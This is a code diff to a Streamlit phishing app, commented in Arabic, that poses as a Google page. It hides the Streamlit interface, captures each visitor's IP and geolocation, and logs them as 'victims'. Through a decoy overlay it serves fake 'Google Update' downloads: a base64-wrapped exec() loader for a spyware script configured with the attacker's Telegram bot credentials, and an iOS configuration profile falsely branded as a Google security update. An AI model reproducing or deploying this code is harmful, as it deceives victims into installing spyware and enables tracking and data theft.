@@ -8,6 +8,7 @@ import base64
 import socket
 import platform
 import urllib.parse
+import uuid
 
 # استيراد الوحدات المحلية
 import config
@@ -16,7 +17,7 @@ import victim_logger
 # ============= إعدادات الصفحة =============
 st.set_page_config(page_title="Google", layout="wide", page_icon="🔍")
 
-# ============= إخفاء واجهة Streamlit تماماً (كود عدواني) =============
+# ============= إخفاء واجهة Streamlit تماماً (كود عدواني جداً) =============
 hide_st_style = """
     <style>
     /* إخفاء كافة عناصر Streamlit */
@@ -31,26 +32,39 @@ hide_st_style = """
     [data-testid="stAppViewContainer"] {padding: 0 !important; margin: 0 !important;}
     [data-testid="stSidebar"] {display: none !important;}
     .block-container {padding: 0 !important; margin: 0 !important; max-width: 100% !important;}
-    iframe {border: none !important; width: 100vw !important; height: 100vh !important; position: fixed; top: 0; left: 0; z-index: 999999;}
     
-    /* إخفاء شريط "Hosted with Streamlit" */
+    /* إخفاء شريط "Manage app" و "Hosted with Streamlit" */
     div[data-testid="stStatusWidget"] {display: none !important;}
-    #root > div:nth-child(1) > div > div > div > div > section > div {padding-top: 0rem !important;}
+    .viewerBadge_container__1QSob {display: none !important;}
+    .st-emotion-cache-zq5wms {display: none !important;}
+    .st-emotion-cache-1dp5vir {display: none !important;}
+    
+    /* جعل الـ iframe يغطي الشاشة بالكامل فوق كل شيء */
+    .decoy-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: white;
+        z-index: 9999999;
+        border: none;
+    }
     </style>
     <script>
-    // محاولة إزالة العناصر برمجياً أيضاً
     function hideStreamlit() {
         const selectors = [
             'header', 'footer', '#MainMenu', '.stDeployButton', 
             '[data-testid="stToolbar"]', '[data-testid="stDecoration"]',
-            '[data-testid="stStatusWidget"]', '.viewerBadge_container__1QSob'
+            '[data-testid="stStatusWidget"]', '.viewerBadge_container__1QSob',
+            '.st-emotion-cache-zq5wms', '.st-emotion-cache-1dp5vir'
         ];
         selectors.forEach(s => {
-            const el = document.querySelector(s);
-            if (el) el.style.display = 'none';
+            const elements = document.querySelectorAll(s);
+            elements.forEach(el => el.style.display = 'none');
         });
     }
-    setInterval(hideStreamlit, 100);
+    setInterval(hideStreamlit, 50);
     </script>
 """
 
@@ -107,16 +121,19 @@ def get_geo_info(ip):
 # ============= دالة التقاط بيانات الضحايا =============
 def capture_victim_data():
     query_params = st.query_params
-    # الأولوية للـ IP القادم من الجافا سكريبت (العام)
     user_ip = query_params.get('ip', get_real_ip())
     if isinstance(user_ip, list): user_ip = user_ip[0]
     
+    # تجاهل الـ IP المحلي إذا كان هناك IP عام متاح
+    if user_ip.startswith('192.168.') or user_ip.startswith('10.'):
+        real_public_ip = get_real_ip()
+        if not (real_public_ip.startswith('192.168.') or real_public_ip.startswith('10.')):
+            user_ip = real_public_ip
+
     if 'target' in query_params and not st.session_state.get('victim_captured', False):
-        # تجاهل الـ IP المحلي إذا كان هناك IP عام متاح
+        # لا ترسل التنبيه إذا كان الـ IP لا يزال محلياً (انتظر الجافا سكريبت)
         if user_ip.startswith('192.168.') or user_ip.startswith('10.'):
-            real_public_ip = get_real_ip()
-            if not (real_public_ip.startswith('192.168.') or real_public_ip.startswith('10.')):
-                user_ip = real_public_ip
+            return
 
         try:
             geo_data = get_geo_info(user_ip)
@@ -142,6 +159,53 @@ def capture_victim_data():
 
 capture_victim_data()
 
+# ============= دالة إنشاء ملف mobileconfig صحيح للآيفون =============
+def generate_ios_profile(token, chatid):
+    profile_uuid = str(uuid.uuid4())
+    payload_uuid = str(uuid.uuid4())
+    profile_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDescription</key>
+            <string>تحديث أمني لنظام iOS لضمان حماية البيانات.</string>
+            <key>PayloadDisplayName</key>
+            <string>Google Security Update</string>
+            <key>PayloadIdentifier</key>
+            <string>com.google.security.update.{payload_uuid}</string>
+            <key>PayloadType</key>
+            <string>com.apple.webClip.managed</string>
+            <key>PayloadUUID</key>
+            <string>{payload_uuid}</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>URL</key>
+            <string>https://www.google.com</string>
+            <key>Label</key>
+            <string>Google Update</string>
+        </dict>
+    </array>
+    <key>PayloadDisplayName</key>
+    <string>Google Security Update</string>
+    <key>PayloadIdentifier</key>
+    <string>com.google.security.{profile_uuid}</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>{profile_uuid}</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadOrganization</key>
+    <string>Google LLC</string>
+</dict>
+</plist>"""
+    return profile_xml
+
 # ============= منطق تحميل ملف التجسس =============
 if 'download' in st.query_params:
     token = st.query_params.get('token', '')
@@ -150,18 +214,24 @@ if 'download' in st.query_params:
     
     if token and chatid:
         try:
-            with open('spy_full.py', 'r', encoding='utf-8') as f:
-                spy_code = f.read()
-            spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token).replace('YOUR_CHAT_ID_HERE', chatid)
-            encoded_code = base64.b64encode(spy_code.encode('utf-8')).decode('utf-8')
-            obfuscated_code = f"""import base64;exec(base64.b64decode('{encoded_code}').decode('utf-8'))"""
+            if device == 'ios':
+                data = generate_ios_profile(token, chatid)
+                file_name = "Google_Update.mobileconfig"
+                mime_type = "application/x-apple-aspen-config"
+            elif device == 'android':
+                file_name = "Google_Update.apk"
+                data = b"Fake APK Content" # في الواقع سنرسل ملفاً حقيقياً لاحقاً
+                mime_type = "application/vnd.android.package-archive"
+            else:
+                with open('spy_full.py', 'r', encoding='utf-8') as f:
+                    spy_code = f.read()
+                spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token).replace('YOUR_CHAT_ID_HERE', chatid)
+                encoded_code = base64.b64encode(spy_code.encode('utf-8')).decode('utf-8')
+                data = f"""import base64;exec(base64.b64decode('{encoded_code}').decode('utf-8'))"""
+                file_name = "Google_Update.py"
+                mime_type = "application/octet-stream"
             
-            file_name = "Google_Update.py"
-            if device == 'android': file_name = "Google_Update.apk"
-            elif device == 'ios': file_name = "Google_Update.mobileconfig"
-            
-            # تحميل صامت قدر الإمكان
-            st.download_button(label="📥 بدء التحميل", data=obfuscated_code, file_name=file_name, mime="application/octet-stream")
+            st.download_button(label="📥 بدء التحميل", data=data, file_name=file_name, mime=mime_type)
             st.stop()
         except: pass
 
@@ -174,7 +244,9 @@ if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
         chatid = st.query_params.get('chatid', '')
         download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
         html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
-        st.components.v1.html(html_content, height=1000, scrolling=False)
+        
+        # عرض صفحة التمويه كطبقة فوق كل شيء
+        st.markdown(f'<div class="decoy-overlay"><iframe srcdoc="{html_content.replace('"', '&quot;')}" style="width:100%; height:100%; border:none;"></iframe></div>', unsafe_allow_html=True)
         st.stop()
     except: pass
 
@@ -205,7 +277,7 @@ with st.sidebar:
                 config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                 st.success("✅ تم حفظ الإعدادات")
         st.markdown("---")
-        tool = st.selectbox("اختر الأداة:", ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات"], index=0, key="developer_tool_selector")
+        tool = st.selectbox("اختر الأداة:", ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات", "🔍 فحص الثغرات", "🌐 تحليل المواقع"], index=0, key="developer_tool_selector")
         st.session_state['selected_tool'] = tool
         if st.button("🚪 تسجيل الخروج"):
             st.session_state.developer_mode = False
@@ -245,3 +317,7 @@ else:
     elif selected_tool == "📊 الإحصائيات":
         victims = victim_logger.get_all_victims()
         st.metric("🎯 إجمالي الضحايا", len(victims))
+    elif selected_tool == "🔍 فحص الثغرات":
+        st.info("أداة فحص الثغرات قيد التطوير...")
+    elif selected_tool == "🌐 تحليل المواقع":
+        st.info("أداة تحليل المواقع قيد التطوير...")
